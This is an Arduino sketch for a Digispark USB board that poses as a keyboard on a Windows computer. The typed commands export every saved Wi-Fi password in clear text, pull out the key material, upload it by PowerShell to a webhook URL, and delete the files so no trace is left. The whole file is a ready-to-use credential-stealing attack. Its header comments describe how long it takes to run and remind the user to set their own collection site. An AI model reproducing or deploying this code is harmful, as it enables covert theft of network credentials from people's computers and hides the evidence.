/*rubberducky code translated to work on digispark by noonessenpa1 
from plug in to no traces 00:00:15.006
original code https://github.com/krankenpanzer wifi pass graber
uncomment some lines for led markings
2 quick blinks - code started
3 slow blinks - code ended (safe to eject)
!!! remember to change website !!!
*/


#include "DigiKeyboard.h"
void setup() {
  pinMode(0, OUTPUT); 
  pinMode(1, OUTPUT); 
}

void loop() {
  
  /*LED effects/markings
  digitalWrite(0, HIGH);   
  digitalWrite(1, HIGH);
  delay(100);
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW);
  delay(100);
  digitalWrite(0, HIGH);   
  digitalWrite(1, HIGH);
  delay(100);
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW);
  */


  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);


  DigiKeyboard.print("cmd /k");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cd Temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("netsh wlan export profile key=clear");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/URL -Method POST -InFile WiFi-PASS"); //change website  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  //leave no trace
  DigiKeyboard.print("del WiFi* /s /f /q");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  //end
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  /*LED effects/markings
  digitalWrite(0, HIGH);   
  digitalWrite(1, HIGH);
  delay(1000);
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW);
  delay(1000);
  digitalWrite(0, HIGH);   
  digitalWrite(1, HIGH);
  delay(1000);
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW);
  delay(1000);
  digitalWrite(0, HIGH);   
  digitalWrite(1, HIGH);
  delay(1000);
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW);
  delay(1000);
  */
  
  
  
  
  for (;;) {
    //no looping!
  }
}
